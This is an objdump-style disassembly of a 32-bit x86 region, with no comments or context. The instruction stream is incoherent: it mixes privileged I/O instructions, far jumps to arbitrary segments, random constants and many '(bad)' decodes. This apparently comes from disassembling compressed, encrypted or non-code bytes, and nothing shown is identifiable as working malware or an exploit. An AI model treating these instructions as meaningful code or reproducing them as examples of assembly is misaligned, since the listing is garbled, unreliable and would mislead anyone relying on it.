  41aa97:	add    esp,ebx
  41aa99:	mov    ah,0xfe
  41aa9b:	std    
  41aa9c:	inc    DWORD PTR [ebx-0x4b]
  41aa9f:	mov    ds:0x70ebe277,al
  41aaa4:	jnp    0x41aa9f
  41aaa6:	in     eax,0x18
  41aaa8:	add    DWORD PTR [eax],eax
  41aaaa:	pop    es
  41aaab:	add    DWORD PTR [eax],eax
  41aaad:	add    dh,dh
  41aaaf:	mov    ebx,0xab8288c3
  41aab4:	ja     0x41aaf9
  41aab6:	xchg   edi,eax
  41aab7:	test   al,0x83
  41aab9:	into   
  41aaba:	fisubr WORD PTR [eax-0x663733b1]
  41aac0:	div    BYTE PTR [ebp+edi*1+0xab8d2a0]
  41aac7:	mov    ecx,0xfc07cc7b
  41aacc:	inc    edx
  41aacd:	je     0x41aa7b
  41aacf:	or     ebp,ebp
  41aad1:	xlat   BYTE PTR ds:[ebx]
  41aad2:	dec    ebp
  41aad3:	fstp   QWORD PTR [edx+edx*2+0xe]
  41aad7:	xor    al,0x6c
  41aad9:	mov    esp,0xa722b431
  41aade:	mov    ch,0xbb
  41aae0:	xor    dl,BYTE PTR [edi]
  41aae2:	mov    ebx,0x545aa4d1
  41aae7:	test   eax,0xa1c9cbb2
  41aaec:	mov    ax,0x18f2
  41aaf0:	mov    ebx,0xd8d89e6f
  41aaf5:	out    dx,al
  41aaf6:	dec    ebx
  41aaf7:	cmp    BYTE PTR [ebx+eax*1],0x71
  41aafb:	mul    BYTE PTR [eax-0x2f]
  41aafe:	sbb    eax,0xbde0547c
  41ab03:	fldcw  WORD PTR [ebx+0x1cb6c772]
  41ab09:	inc    esp
  41ab0a:	cwd    
  41ab0c:	rcr    DWORD PTR [esi],cl
  41ab0e:	adc    edi,ebx
  41ab10:	mov    al,0xc3
  41ab12:	push   esp
  41ab13:	pop    edi
  41ab14:	dec    esi
  41ab15:	sar    BYTE PTR [edi+0x7b],0xa5
  41ab19:	pop    es
  41ab1a:	imul   ebp,DWORD PTR [edi+0x3e],0xffffffb3
  41ab1e:	or     DWORD PTR [ecx+0xf8b5e3b],ecx
  41ab24:	mov    dh,0x4
  41ab26:	mov    edi,0x1bb6913
  41ab2b:	sub    ecx,edx
  41ab2d:	popf   
  41ab2e:	and    al,0xb8
  41ab30:	ret    0xed14
  41ab33:	jp     0x41aae3
  41ab35:	iret   
  41ab36:	push   ss
  41ab37:	dec    ebp
  41ab38:	in     al,dx
  41ab39:	jp     0x41ab4c
  41ab3b:	jp     0x41ab44
  41ab3d:	sub    al,0x3e
  41ab3f:	loope  0x41ab8a
  41ab41:	mov    ebx,ebp
  41ab43:	adc    al,ch
  41ab45:	es mov esi,0x1e2698aa
  41ab4b:	lods   al,BYTE PTR ds:[esi]
  41ab4c:	test   eax,0xdd668d8f
  41ab51:	int3   
  41ab52:	out    0x1f,al
  41ab54:	sub    BYTE PTR [ebx+0x365c8510],bh
  41ab5a:	cmp    eax,0xabef8ceb
  41ab5f:	and    edx,edx
  41ab61:	xchg   edi,eax
  41ab62:	mov    ebp,0xdb21c8a8
  41ab67:	jp     0x41aafb
  41ab69:	adc    al,0x8d
  41ab6b:	xor    eax,DWORD PTR [eax-0x4c5e52c2]
  41ab71:	mov    ch,0xa0
  41ab73:	fld    QWORD PTR [ecx]
  41ab75:	loopne 0x41abbb
  41ab77:	adc    al,BYTE PTR [esi-0x32]
  41ab7a:	pop    esi
  41ab7b:	sbb    eax,0x70b8c945
  41ab80:	push   edx
  41ab81:	mov    edx,0x2fec9f56
  41ab86:	xor    esp,esp
  41ab88:	pop    ebp
  41ab89:	ins    DWORD PTR es:[edi],dx
  41ab8a:	test   DWORD PTR [ecx+0x55f2f3a6],ecx
  41ab90:	or     DWORD PTR [edx],esp
  41ab92:	jns    0x41abbc
  41ab94:	outs   dx,BYTE PTR ds:[esi]
  41ab95:	xchg   esp,eax
  41ab96:	jl     0x41ab24
  41ab98:	outs   dx,DWORD PTR ds:[esi]
  41ab99:	or     BYTE PTR [ebx-0x6bd23f06],dl
  41ab9f:	sahf   
  41aba0:	jg     0x41abb1
  41aba2:	int    0x18
  41aba4:	lods   al,BYTE PTR ds:[esi]
  41aba5:	outs   dx,BYTE PTR ds:[esi]
  41aba6:	mov    edx,0xa851b4fe
  41abab:	nop
  41abac:	xchg   ebx,eax
  41abad:	sbb    DWORD PTR ds:0xb416940,edi
  41abb3:	adc    edi,edi
	...
  41ac15:	add    BYTE PTR [edx+0x49],ch
  41ac18:	es cmp al,0x27
  41ac1b:	jg     0x41ac97
  41ac1d:	pop    edi
  41ac1e:	pop    esp
  41ac1f:	mov    edx,0x83fecc53
  41ac24:	cmp    DWORD PTR [ebx],ebp
  41ac26:	in     al,dx
  41ac27:	sbb    DWORD PTR [ecx],eax
  41ac29:	add    BYTE PTR [edi],al
  41ac2b:	add    DWORD PTR [eax],eax
  41ac2d:	add    BYTE PTR [ecx-0x515e13ee],ah
  41ac33:	push   0xffffff9c
  41ac35:	icebp  
  41ac36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ac38:	retf   0x584e
  41ac3b:	dec    ebp
  41ac3c:	hlt    
  41ac3d:	push   ecx
  41ac3e:	jmp    0x177d:0xd7c13fcf
  41ac45:	sbb    eax,0x61ad74b1
  41ac4a:	inc    esp
  41ac4b:	pop    ds
  41ac4c:	mov    WORD PTR [ecx+0x5f],cs
  41ac4f:	popa   
  41ac50:	mov    dh,0x37
  41ac52:	test   eax,0xc591168b
  41ac57:	jae    0x41ac62
  41ac59:	call   0xbc4:0x2363001c
  41ac60:	push   ds
  41ac61:	pop    ecx
  41ac62:	xor    esi,DWORD PTR [eax+0x3c]
  41ac65:	ja     0x41ac8d
  41ac67:	xor    BYTE PTR [ebp-0x79],0xef
  41ac6b:	xor    dh,BYTE PTR [eax]
  41ac6d:	sub    DWORD PTR [ebp-0x80],edx
  41ac70:	sbb    al,0x5a
  41ac72:	mov    BYTE PTR [ebx+0x6b],bl
  41ac75:	xor    eax,0x397b3fbb
  41ac7a:	imul   esp,DWORD PTR [eax-0x6e],0x7b
  41ac7e:	add    al,BYTE PTR [esi+ebx*4-0x53]
  41ac82:	sti    
  41ac83:	cwde   
  41ac84:	in     al,0xaa
  41ac86:	xchg   ch,cl
  41ac88:	xor    DWORD PTR [edx+0x463615bc],0x79
  41ac8f:	fnsave [ecx-0x3d442196]
  41ac95:	adc    esi,eax
  41ac97:	scas   eax,DWORD PTR es:[edi]
  41ac98:	das    
  41ac99:	(bad)  
  41ac9a:	mov    ?,WORD PTR [edi-0x3]
  41ac9d:	sbb    DWORD PTR [ebx+0x5b],edi
  41aca0:	xor    BYTE PTR [eax+0x7b11eac1],bl
  41aca6:	jle    0x41ac9d
  41aca8:	pop    es
  41aca9:	call   0x7dfe8100
  41acae:	jp     0x41ace3
  41acb0:	xchg   ebp,eax
  41acb1:	mov    al,0xc4
  41acb3:	sbb    ah,0xd8
  41acb6:	and    bl,BYTE PTR [ebx-0x6e153d62]
  41acbc:	call   0x9cb9b418
  41acc1:	mov    bh,0x48
  41acc3:	daa    
  41acc4:	dec    esp
  41acc5:	retf   0x5e09
  41acc8:	js     0x41ac92
  41acca:	pop    es
  41accb:	push   ss
  41accc:	out    dx,eax
  41accd:	push   es
  41acce:	js     0x41acee
  41acd0:	or     DWORD PTR [ebp-0x2e0f9971],ecx
  41acd6:	mov    bl,0x39
  41acd8:	push   es
  41acd9:	test   eax,0xe8c0a547
  41acde:	out    0xd1,al
  41ace0:	cmp    cl,al
  41ace2:	js     0x41ad42
  41ace4:	jbe    0x41ac9a
  41ace6:	push   ss
  41ace7:	jp     0x41acb3
  41ace9:	sub    eax,0x26fa5f36
  41acee:	push   ds
  41acef:	jmp    0xcacd:0x1962974f
  41acf6:	stos   BYTE PTR es:[edi],al
  41acf7:	mov    DWORD PTR [edi-0x4169a7c7],esi
  41acfd:	(bad)  
  41acfe:	or     DWORD PTR cs:[edx-0x63f53367],eax
  41ad05:	jmp    0x41ace4
  41ad07:	fsubr  DWORD PTR [edi-0xf]
  41ad0a:	push   esp
  41ad0b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad0c:	jl     0x41ad2a
  41ad0e:	mov    DWORD PTR [ecx],esp
  41ad10:	ud1    ebp,DWORD PTR [ebx-0x680ead24]
  41ad17:	js     0x41acc8
  41ad19:	add    eax,DWORD PTR [ebx]
  41ad1b:	fyl2xp1 
  41ad1d:	(bad)  
  41ad1e:	repnz lods al,BYTE PTR ds:[esi]
  41ad20:	xor    ah,al
  41ad22:	(bad)  
  41ad23:	sbb    ebp,DWORD PTR [ecx]
  41ad25:	jmp    0xb2eea40a
  41ad2a:	aam    0x4a
  41ad2c:	sbb    al,0xbd
  41ad2e:	pusha  
  41ad2f:	jp     0x41ad0d
  41ad31:	sub    dh,BYTE PTR [edx+0x40]
  41ad34:	std    
	...
  41ad95:	add    BYTE PTR [ebp-0x8],dl
  41ad98:	or     DWORD PTR [esi-0x4280053],ebx
  41ad9e:	mov    dh,BYTE PTR [eax+eax*4]
  41ada1:	add    ecx,DWORD PTR [eax-0x6e]
  41ada4:	xor    DWORD PTR [edi+0x11af3],ecx
  41adaa:	pop    es
  41adab:	add    DWORD PTR [eax],eax
  41adad:	add    BYTE PTR [esp+ebx*2-0x235ff5c0],bl
  41adb4:	push   edi
  41adb5:	xlat   BYTE PTR ds:[ebx]
  41adb6:	imul   ecx,DWORD PTR [esi],0xbc84989a
  41adbc:	jp     0x41ad64
  41adbe:	shl    DWORD PTR [ebx+0x46372556],1
  41adc4:	mov    ebp,0xa283a545
  41adc9:	and    dh,BYTE PTR [esi+0x45]
  41adcc:	push   es
  41adcd:	add    DWORD PTR [edi+0x49],esi
  41add0:	jae    0x41ad54
  41add2:	fisub  DWORD PTR [esi]
  41add4:	shl    DWORD PTR [ebp-0x4d],cl
  41add7:	push   cs
  41add8:	mov    esp,0xe9a650a5
  41addd:	dec    ah
  41addf:	jb     0x41ae0c
  41ade1:	pushf  
  41ade2:	mov    eax,0xaa446588
  41ade8:	sbb    al,0x4c
  41adea:	xor    DWORD PTR [ecx],0xffffff9c
  41aded:	aas    
  41adee:	idiv   DWORD PTR ds:0x7f9d2eda
  41adf4:	sti    
  41adf5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adf6:	sub    cl,BYTE PTR [edi+esi*4-0x71]
  41adfa:	xor    DWORD PTR [edi],edx
  41adfc:	jnp    0x41ae2f
  41adfe:	push   ebp
  41adff:	cli    
  41ae00:	sbb    eax,0x447df33f
  41ae05:	xchg   esi,eax
  41ae06:	mov    al,0x23
  41ae08:	stos   BYTE PTR es:[edi],al
  41ae09:	adc    eax,0x6d55924d
  41ae0e:	jae    0x41ae3b
  41ae10:	mov    edi,0xb0e0c0c4
  41ae15:	xlat   BYTE PTR ds:[ebx]
  41ae16:	push   ecx
  41ae17:	addr16 push ebx
  41ae19:	(bad)  
  41ae1c:	jecxz  0x41adf7
  41ae1e:	leave  
  41ae1f:	in     eax,0xe0
  41ae21:	and    DWORD PTR [eax+ebp*8-0x57f5ce20],edx
  41ae28:	out    0xd9,al
  41ae2a:	jp     0x41adee
  41ae2c:	add    eax,0x7e99ac49
  41ae31:	mov    bh,0xc1
  41ae33:	scas   eax,DWORD PTR es:[edi]
  41ae34:	mov    eax,ds:0x3f6f794b
  41ae39:	jb     0x41adea
  41ae3b:	sbb    eax,0x90960a4a
  41ae40:	div    DWORD PTR [ebx-0x3a]
  41ae43:	jne    0x41ae54
  41ae45:	sub    ebp,DWORD PTR [eax]
  41ae47:	xlat   BYTE PTR ds:[ebx]
  41ae48:	dec    edi
  41ae49:	lods   al,BYTE PTR ds:[esi]
  41ae4a:	jne    0x41aea9
  41ae4c:	cmp    edi,DWORD PTR [eax-0x2b]
  41ae4f:	daa    
  41ae50:	and    ah,BYTE PTR ds:0xdfacc0d7
  41ae56:	pop    ss
  41ae57:	sub    BYTE PTR [esi],bl
  41ae59:	cwde   
  41ae5a:	mov    esp,0xe6a39d53
  41ae5f:	mov    edi,ecx
  41ae61:	fwait
  41ae62:	outs   dx,BYTE PTR ds:[esi]
  41ae63:	mov    edx,0x315400ad
  41ae68:	repz rcr DWORD PTR [ebp-0x3],cl
  41ae6c:	daa    
  41ae6d:	stos   DWORD PTR es:[edi],eax
  41ae6e:	call   0x173fa1c6
  41ae73:	adc    al,0xa4
  41ae75:	test   BYTE PTR [edx+0x29],ch
  41ae78:	(bad)  
  41ae79:	push   esi
  41ae7a:	loope  0x41aec9
  41ae7c:	int    0x82
  41ae7e:	mov    eax,0xc215bf8a
  41ae83:	xchg   ebx,eax
  41ae84:	dec    edi
  41ae85:	repnz mov esp,0xa3b13416
  41ae8b:	mov    ds:0x6737f41a,al
  41ae90:	mov    bh,0xad
  41ae92:	sahf   
  41ae93:	sti    
  41ae94:	loop   0x41ae8f
  41ae96:	test   al,0xb9
  41ae98:	gs push ds
  41ae9a:	and    bl,BYTE PTR [ecx-0x3e]
  41ae9d:	popa   
  41ae9e:	sub    al,0x5a
  41aea0:	and    al,0x66
  41aea2:	jg     0x41aeb6
  41aea4:	mov    ds:0x92eb13e6,al
  41aea9:	xchg   edx,eax
  41aeaa:	push   esp
  41aeab:	loopne 0x41ae59
  41aead:	(bad)  
  41aeae:	ins    DWORD PTR es:[edi],dx
  41aeaf:	adc    DWORD PTR ds:[edx],edx
  41aeb2:	sub    DWORD PTR [ebp*8+0x0],eax
	...
  41af15:	add    ch,al
  41af17:	stc    
  41af18:	lods   eax,DWORD PTR ds:[esi]
  41af19:	xor    edi,DWORD PTR [ebp+0x56ffdf77]
  41af1f:	xor    al,0x39
  41af21:	loop   0x41af01
  41af23:	call   0x1:0x1bfa5fb4
  41af2a:	pop    es
  41af2b:	add    DWORD PTR [eax],eax
  41af2d:	add    bh,dl
  41af2f:	out    0xac,eax
  41af31:	push   cs
  41af32:	arpl   WORD PTR [edi+ecx*2],si
  41af35:	punpckldq mm6,DWORD PTR [ecx+0x7b0c5290]
  41af3c:	jnp    0x41afab
  41af3e:	fdiv   st(5),st
  41af40:	fisttp DWORD PTR [edx]
  41af42:	in     al,0x42
  41af44:	sbb    DWORD PTR [ebp-0x49400e2c],ecx
  41af4a:	loopne 0x41af75
  41af4c:	imul   edx,DWORD PTR [ebx],0x2c7184b5
  41af52:	in     al,dx
  41af53:	js     0x41afbc
  41af55:	or     esi,DWORD PTR [eax+0x12f0b313]
  41af5b:	add    edi,eax
  41af5d:	mov    ebp,0x677bf44
  41af62:	test   BYTE PTR ds:0xd1f67c6e,ch
  41af68:	pop    eax
  41af69:	sub    esp,0x6da6f05b
  41af6f:	and    eax,0xc35ec141
  41af74:	jno    0x41afe5
  41af76:	push   esp
  41af77:	lods   eax,DWORD PTR ds:[esi]
  41af78:	shl    cl,0xd
  41af7b:	mov    al,0x70
  41af7d:	cmp    BYTE PTR [esi+esi*2+0x15],dl
  41af81:	jl     0x41aff4
  41af83:	(bad)  
  41af84:	enter  0xeeb8,0x78
  41af88:	shl    BYTE PTR cs:[ecx+0x3eeb4bd5],0xe3
  41af90:	call   0xd608:0x9cadca9
  41af97:	cs out dx,eax
  41af99:	push   esp
  41af9a:	mov    bl,0x19
  41af9c:	xchg   ch,ah
  41af9e:	lods   eax,DWORD PTR ds:[esi]
  41af9f:	nop
  41afa0:	out    0x31,al
  41afa2:	shl    ah,0x4b
  41afa5:	aas    
  41afa6:	adc    eax,0x4e996999
  41afab:	mov    eax,0x35232a68
  41afb0:	ds cmp eax,0x822bf479
  41afb6:	imul   esi,DWORD PTR [ebx],0x7f74ec23
  41afbc:	pop    edx
  41afbd:	ret    0xff12
  41afc0:	or     BYTE PTR [ebp+0x5c],ch
  41afc3:	out    0x81,al
  41afc5:	fdivr  QWORD PTR [edx-0xd]
  41afc8:	xor    al,0xc6
  41afca:	mov    ch,0xf9
  41afcc:	dec    esp
  41afcd:	mov    fs,WORD PTR [ecx-0x793cb40e]
  41afd3:	sbb    eax,0x69764bb4
  41afd8:	mov    eax,ds:0x2637d9e6
  41afdd:	out    dx,eax
  41afde:	jne    0x41af93
  41afe0:	mov    al,ds:0xa68d0a0c
  41afe5:	fsubp  st(1),st
  41afe7:	dec    ecx
  41afe8:	std    
  41afe9:	(bad)  [ebx]
  41afeb:	lahf   
  41afec:	or     ch,BYTE PTR [ebp+esi*4+0x21]
  41aff0:	adc    BYTE PTR [edx+eiz*8-0x3580c9b7],ch
  41aff7:	pop    esp
  41aff8:	pusha  
  41aff9:	mov    dh,BYTE PTR [eax-0x22]
  41affc:	sbb    eax,0xf26bd38
  41b001:	mov    eax,ds:0x2c54dd9a
  41b006:	mov    esi,0x5b1eb3d
  41b00b:	mov    eax,0xf3ca2ff0
  41b010:	lea    ebx,[ebx-0x7d842728]
  41b016:	sbb    ebp,DWORD PTR [ebx+0xe]
  41b019:	pop    edx
  41b01a:	test   al,0xd3
  41b01c:	fimul  WORD PTR [ebp-0x3777733e]
  41b022:	push   esp
  41b023:	lods   eax,DWORD PTR ds:[esi]
  41b024:	sti    
  41b025:	add    ah,BYTE PTR [esi+0x71]
  41b028:	call   0x96c7452e
  41b02d:	shr    ebp,0xb3
  41b030:	in     eax,0xfd
  41b032:	xchg   ebx,edi
  41b034:	cmp    al,BYTE PTR [eax]
	...
  41b096:	(bad)  
  41b097:	ficom  WORD PTR [eax]
  41b099:	stos   DWORD PTR es:[edi],eax
  41b09a:	sbb    bh,ch
  41b09c:	(bad)  
  41b09d:	jmp    DWORD PTR [eax]
  41b09f:	jmp    FWORD PTR [esi-0x123a9bcf]
  41b0a5:	push   esi
  41b0a6:	add    DWORD PTR ds:0x1070001,ebx
  41b0ac:	add    BYTE PTR [eax],al
  41b0ae:	fwait
  41b0af:	(bad)  
  41b0b0:	aaa    
  41b0b1:	call   0xa1f902ec
  41b0b6:	pop    eax
  41b0b7:	add    eax,0xe2514449
  41b0bc:	loopne 0x41b0db
  41b0be:	push   esp
  41b0bf:	jg     0x41b094
  41b0c1:	push   ss
  41b0c2:	div    BYTE PTR [eax]
  41b0c4:	stc    
  41b0c5:	mov    edi,0x72c4fbe7
  41b0ca:	mov    edx,esp
  41b0cc:	jle    0x41b0d5
  41b0ce:	push   eax
  41b0cf:	cmp    esp,DWORD PTR [esi]
  41b0d1:	ins    BYTE PTR es:[edi],dx
  41b0d2:	xchg   edx,eax
  41b0d3:	nop
  41b0d4:	inc    eax
  41b0d5:	pop    sp
  41b0d7:	data16 je 0x41b094
  41b0da:	mov    WORD PTR ds:0x3bd5,fs
  41b0df:	rcl    BYTE PTR [ecx+0x1e],1
  41b0e2:	out    0xbd,al
  41b0e4:	mov    dl,0xb5
  41b0e6:	jl     0x41b141
  41b0e8:	xchg   ebp,eax
  41b0e9:	pop    ds
  41b0ea:	lods   eax,DWORD PTR ds:[esi]
  41b0eb:	aaa    
  41b0ec:	fistp  QWORD PTR [ebx]
  41b0ee:	imul   ecx,DWORD PTR [ebp+0xe],0x30
  41b0f2:	pop    eax
  41b0f3:	mov    dh,0x2
  41b0f5:	ret    0x7a12
  41b0f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b0f9:	cmp    DWORD PTR [esi+0x492d4e80],ecx
  41b0ff:	std    
  41b100:	popa   
  41b101:	dec    esi
  41b102:	stos   BYTE PTR es:[edi],al
  41b103:	cwde   
  41b104:	into   
  41b105:	fmul   DWORD PTR [ebp-0x6a]
  41b108:	cmp    al,0x9c
  41b10a:	shl    DWORD PTR [ebp+0x41997f4e],1
  41b110:	loop   0x41b0c8
  41b112:	mov    ecx,0x2e63e56d
  41b117:	sbb    eax,0x86d1bd49
  41b11c:	cmp    ebp,DWORD PTR [bx+si-0x5973]
  41b121:	push   edx
  41b122:	pop    ss
  41b123:	mov    edi,0x7c71a1d0
  41b128:	into   
  41b129:	jnp    0x41b168
  41b12b:	rcr    edx,1
  41b12d:	cmp    eax,0xceafaa36
  41b132:	fild   WORD PTR [edx-0x43]
  41b135:	mov    ch,0xa7
  41b137:	fidivr WORD PTR [ebx+edx*2-0x2e]
  41b13b:	and    edi,DWORD PTR [edx+0x41d32547]
  41b141:	xchg   ebx,eax
  41b142:	cmp    DWORD PTR [esi+0x6b60f6d6],esp
  41b148:	in     al,0xef
  41b14a:	jo     0x41b192
  41b14c:	dec    eax
  41b14d:	neg    dl
  41b14f:	cmp    eax,0x3fc14881
  41b154:	jae    0x41b154
  41b156:	sbb    DWORD PTR [edi-0x3353836e],0x23675afa
  41b160:	into   
  41b161:	rol    DWORD PTR [edx+0x3eeff3f6],1
  41b167:	test   DWORD PTR [edi+0x40ac532],0xe8b8964e
  41b171:	repz test BYTE PTR [edi-0x4f],0x69
  41b176:	out    dx,eax
  41b177:	rcl    ch,1
  41b179:	pop    ss
  41b17a:	out    0x0,al
  41b17c:	jle    0x41b1a9
  41b17e:	lods   eax,DWORD PTR ds:[esi]
  41b17f:	jb     0x41b181
  41b181:	xchg   edi,eax
  41b182:	btr    esp,edi
  41b185:	sub    DWORD PTR [edx-0x53],esp
  41b188:	inc    esi
  41b189:	dec    DWORD PTR [eax-0xd]
  41b18c:	mov    dh,0x73
  41b18e:	push   ds
  41b18f:	ds repz add eax,0xaba6c94a
  41b196:	jo     0x41b1cb
  41b198:	bound  esp,QWORD PTR ds:0x69dd845d
  41b19e:	xchg   edx,eax
  41b19f:	loopne 0x41b1b9
  41b1a1:	enter  0xb3d,0xda
  41b1a5:	jns    0x41b1b9
  41b1a7:	inc    ecx
  41b1a8:	or     edi,edx
  41b1aa:	(bad)  
  41b1ab:	in     eax,dx
  41b1ac:	and    dh,BYTE PTR [eax-0xcde24ce]
  41b1b2:	cs mov al,0xeb
	...
  41b215:	add    BYTE PTR [esi+0x6be069a5],cl
  41b21b:	in     al,dx
  41b21c:	(bad)  
  41b21d:	out    dx,eax
  41b21e:	arpl   WORD PTR [edi-0x53],sp
  41b221:	aas    
  41b222:	xor    al,0x47
  41b224:	popa   
  41b225:	xchg   esi,eax
  41b226:	or     BYTE PTR [esi],bl
  41b228:	add    DWORD PTR [eax],eax
  41b22a:	pop    es
  41b22b:	add    DWORD PTR [eax],eax
  41b22d:	add    BYTE PTR [esi-0x68],dl
  41b230:	lds    esi,FWORD PTR [edi-0xd]
  41b233:	and    esi,DWORD PTR [eax]
  41b235:	fdivr  DWORD PTR [ecx-0x1418c89b]
  41b23b:	cmp    al,0x48
  41b23d:	out    dx,eax
  41b23e:	lahf   
  41b23f:	push   cs
  41b240:	arpl   bx,di
  41b242:	cwde   
  41b243:	loop   0x41b2b1
  41b245:	xchg   ecx,eax
  41b246:	iret   
  41b247:	jg     0x41b279
  41b249:	mov    DWORD PTR [ebx+eiz*2-0x390e9a96],ebp
  41b250:	sub    BYTE PTR ds:0xf9d7b787,bh
  41b256:	push   0x96e95c45
  41b25b:	retf   0xdcd5
  41b25e:	inc    edi
  41b25f:	cdq    
  41b260:	sbb    eax,0xae5ee9f5
  41b265:	stos   BYTE PTR es:[edi],al
  41b266:	dec    edi
  41b267:	xchg   edx,eax
  41b268:	add    eax,0xb2d9c85
  41b26d:	fcmovnu st,st(2)
  41b26f:	sub    DWORD PTR [edx+0x73cecfb8],ecx
  41b275:	mov    ebx,0x3e21dff4
  41b27a:	add    DWORD PTR [eax+0x7f],eax
  41b27d:	test   eax,0x829e81fb
  41b282:	js     0x41b241
  41b284:	mov    edi,0x3415e08d
  41b289:	fcmovne st,st(6)
  41b28b:	scas   eax,DWORD PTR es:[edi]
  41b28c:	dec    eax
  41b28d:	fild   QWORD PTR [eax+0x1]
  41b290:	out    0xb,al
  41b292:	adc    ecx,ebp
  41b294:	mov    esi,0x67c31a26
  41b299:	xor    eax,0x185937e4
  41b29e:	xchg   ecx,eax
  41b29f:	cdq    
  41b2a0:	dec    DWORD PTR [edx-0xd833207]
  41b2a6:	lock cmps DWORD PTR gs:[esi],DWORD PTR es:[edi]
  41b2a9:	arpl   cx,di
  41b2ab:	jae    0x41b312
  41b2ad:	into   
  41b2ae:	pushf  
  41b2af:	and    BYTE PTR [edi+0x39],dh
  41b2b2:	test   DWORD PTR [ebx],eax
  41b2b4:	hlt    
  41b2b5:	mov    ebx,0xb4576d4f
  41b2ba:	iret   
  41b2bb:	mov    cl,0xc4
  41b2bd:	(bad)
  41b2c0:	icebp  
  41b2c1:	push   esi
  41b2c2:	rcr    DWORD PTR [esi],cl
  41b2c4:	add    esp,edi
  41b2c6:	mov    ebp,0x721ff36
  41b2cb:	mov    ds:0x34abb694,al
  41b2d0:	xor    al,0xf9
  41b2d2:	inc    ebx
  41b2d3:	add    ch,BYTE PTR [eax-0x5408d806]
  41b2d9:	xor    al,0x58
  41b2db:	int3   
  41b2dc:	mov    edi,DWORD PTR [ebp-0x2ee1220a]
  41b2e2:	push   ecx
  41b2e3:	inc    ebx
  41b2e4:	adc    ah,BYTE PTR [edx+0x64a7b945]
  41b2ea:	fisub  WORD PTR [esi-0x37]
  41b2ed:	test   DWORD PTR [ebp+0x54a8380],edx
  41b2f3:	mov    ecx,0xf8436344
  41b2f8:	in     al,dx
  41b2f9:	mov    ecx,0xb73cadbe
  41b2fe:	pop    esi
  41b2ff:	(bad)  
  41b300:	xchg   ecx,eax
  41b301:	mov    al,0x5b
  41b303:	mov    dh,0xd8
  41b305:	add    al,0x3d
  41b307:	add    al,0xdb
  41b309:	jecxz  0x41b304
  41b30b:	mov    cl,0x93
  41b30d:	and    eax,DWORD PTR [eax+0x55]
  41b310:	dec    ebx
  41b311:	out    dx,al
  41b312:	dec    edx
  41b313:	test   BYTE PTR [ebx-0x652b4177],0x57
  41b31a:	cmp    ah,ah
  41b31c:	adc    eax,0xf85d40
  41b321:	cmp    esi,ecx
  41b323:	aaa    
  41b324:	push   es
  41b325:	jmp    0xabf:0x44ffbfd3
  41b32c:	jmp    0xac44:0x126c2aa3
  41b333:	ror    BYTE PTR [eax+eax*1+0x0],0x0
	...
  41b394:	add    BYTE PTR [eax],al
  41b396:	dec    eax
  41b397:	or     eax,0xbb5dab1d
  41b39c:	(bad)  
  41b39d:	out    dx,eax
  41b39e:	cld    
  41b39f:	(bad)  
  41b3a0:	mov    ?,eax
  41b3a2:	out    0x40,eax
  41b3a4:	gs mov edi,0x11f0f
  41b3aa:	pop    es
  41b3ab:	add    DWORD PTR [eax],eax
  41b3ad:	add    BYTE PTR [ebx+0x5d],al
  41b3b0:	jno    0x41b417
  41b3b2:	inc    edi
  41b3b3:	jbe    0x41b3d4
  41b3b5:	fdivr  QWORD PTR [eax]
  41b3b7:	imul   ecx,DWORD PTR [edx-0x3f],0xffffff85
  41b3bb:	xor    al,ah
  41b3bd:	mov    ecx,0x45401844
  41b3c2:	cld    
  41b3c3:	dec    eax
  41b3c4:	xchg   edi,eax
  41b3c5:	xchg   BYTE PTR [ebx],cl
  41b3c7:	jge    0x41b38f
  41b3c9:	sub    al,BYTE PTR [ecx+esi*2-0x64486496]
  41b3d0:	fnsave [edi+0x6af02d91]
  41b3d6:	fs push es
  41b3d8:	arpl   WORD PTR [esi],cx
  41b3da:	les    ecx,FWORD PTR [ebx+0x7f8500d9]
  41b3e0:	dec    esi
  41b3e1:	jle    0x41b413
  41b3e3:	sbb    DWORD PTR [ecx+0xf],ebx
  41b3e6:	adc    bl,BYTE PTR [esi+ebp*4]
  41b3e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3ea:	or     bh,BYTE PTR fs:[ecx+0x7f]
  41b3ee:	cmp    BYTE PTR [edi-0x254f6dd],dl
  41b3f4:	retf   
  41b3f5:	bound  esi,QWORD PTR [ebp-0x4d]
  41b3f8:	icebp  
  41b3f9:	loopne 0x41b3a1
  41b3fb:	jle    0x41b390
  41b3fd:	ds mov bh,0x44
  41b400:	ins    BYTE PTR es:[di],dx
  41b402:	pop    ss
  41b403:	push   ecx
  41b404:	add    ebp,edx
  41b406:	ds jne 0x41b488
  41b409:	cmp    DWORD PTR [ebp+edx*2-0x6],0xe635ffcf
  41b411:	push   ds
  41b412:	imul   eax,DWORD PTR [ebp-0x261a65c4],0x794893ae
  41b41c:	aad    0x2b
  41b41e:	or     esp,DWORD PTR gs:[esi]
  41b421:	mov    ds:0x410184,al
  41b426:	push   ebx
  41b427:	xchg   ebx,eax
  41b428:	xchg   edx,eax
  41b429:	add    DWORD PTR [edi+eax*2+0x8],ecx
  41b42d:	xchg   ebx,eax
  41b42e:	cmp    DWORD PTR [ecx],ebp
  41b430:	sbb    al,0x7f
  41b432:	pop    ds
  41b433:	scas   al,BYTE PTR es:[edi]
  41b434:	sbb    BYTE PTR [ecx-0x63597b7b],ch
  41b43a:	cmp    eax,0x6e56523d
  41b43f:	ins    DWORD PTR es:[edi],dx
  41b440:	jmp    0x9d49:0x8d73c5fa
  41b447:	mov    cl,0xfe
  41b449:	imul   esp,ebx,0xffffff80
  41b44c:	cli    
  41b44d:	in     eax,dx
  41b44e:	push   esi
  41b44f:	add    DWORD PTR [edi],esp
  41b451:	add    eax,0xe682a473
  41b456:	dec    edx
  41b457:	jmp    0xa389:0xae148d44
  41b45e:	xchg   ebx,eax
  41b45f:	test   al,0x64
  41b461:	add    eax,0xd2145883
  41b466:	imul   edi,DWORD PTR [eax],0xffffffc5
  41b469:	xchg   ebx,eax
  41b46a:	adc    esp,edx
  41b46c:	sbb    eax,0x457ff561
  41b471:	int3   
  41b472:	adc    eax,DWORD PTR [ebx]
  41b474:	ficom  DWORD PTR [esi+0x59]
  41b477:	or     DWORD PTR ds:0x4b7a893f,0xa445a704
  41b481:	xor    al,0xe0
  41b483:	jo     0x41b42b
  41b485:	pop    edi
  41b486:	ds xchg eax,edi
